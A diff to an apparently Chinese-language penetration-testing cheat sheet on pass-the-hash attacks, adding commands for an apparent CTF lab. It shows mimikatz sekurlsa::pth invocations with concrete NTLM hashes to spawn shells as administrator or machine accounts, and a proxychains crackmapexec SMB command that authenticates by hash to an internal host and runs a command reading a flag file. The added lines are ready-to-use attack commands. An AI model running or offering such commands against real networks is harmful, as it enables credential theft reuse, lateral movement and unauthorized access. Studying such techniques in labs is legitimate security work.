@@ -156,6 +156,10 @@ powershell -command "cd C:/Users/benbi/Desktop/; Import-Module .\powerview.ps1; 
 ```sh
 sekurlsa::pth /user:administrator /domain:g1ts /ntlm:ad5a870327c02f83cb947af6a94a4c23
 mimikatz.exe "sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:powershell.exe"
+# pth 传递弹出cmd
+mimikatz.exe "privilege::debug" "sekurlsa::pth /user:WIN2016$ /domain:g1ts /ntlm:19b241fc247a06034210b12ae3aca2d9"
+# pth 读取数据
+proxychains crackmapexec smb 172.22.8.15 -u WIN2016$ -H290b14ec023182beeb4890dbe5b9774b -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"
 ```
 
 ### pth远程桌面登录
